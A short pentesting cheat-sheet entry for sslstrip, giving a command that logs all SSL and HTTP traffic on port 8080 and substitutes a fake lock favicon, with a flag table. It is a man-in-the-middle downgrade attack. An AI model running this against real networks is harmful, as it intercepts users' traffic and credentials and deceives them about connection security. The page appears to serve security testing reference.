# Strip SSL
1) [Setup Port Redirection](../../Shells/Linux/README.md#Setup-Port-Redirection-Using-Tables)
```bash
sslstrip -a -f -l 8080 -w <Logfile Name>
```

| Flag | Description |
|------|-------------|
| -w   | Specify file to log to (optional) |
| -p   | Log only SSL POSTs. (default) |
| -s   | Log all SSL traffic to and from server. |
| -a   | Log all SSL and HTTP traffic to and from server. |
| -l   | Port to listen on (default 10000). |
| -f   | Substitute a lock favicon on secure requests. |
| -k   | Kill sessions in progress. |
| -h   | Print this help message. |
